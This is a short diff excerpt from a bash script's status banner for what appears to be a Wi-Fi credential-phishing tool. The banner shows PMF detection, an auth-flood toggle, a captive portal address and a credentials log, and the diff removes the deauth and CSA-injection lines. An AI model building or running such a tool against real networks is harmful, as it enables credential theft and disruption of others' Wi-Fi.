     echo -e " PMF Detected: ${CYAN}$(if [ "$PMF_ENABLED" -eq 0 ]; then echo "NO"; elif [ "$PMF_ENABLED" -eq 1 ]; then echo "CAPABLE"; else echo "REQUIRED"; fi)${NC}"
     echo -e " Auth Flood:   ${CYAN}$([ "$AUTH_FLOOD" -eq 1 ] && echo "ON" || echo "OFF")${NC}"
-    echo -e " Deauth:       ${CYAN}$([ "$DEAUTH_ENABLED" -eq 1 ] && echo "ON" || echo "OFF")${NC}"
-    echo -e " CSA Inject:   ${CYAN}$([ "$CSA_ENABLED" -eq 1 ] && echo "ON" || echo "OFF")${NC}"
     echo -e " Portal:       ${CYAN}http://${PORTAL_IP}/${NC}"
     echo -e " Creds Log:    ${CYAN}$CREDS_LOG${NC}"
     echo -e "${GREEN}======================================================${NC}"
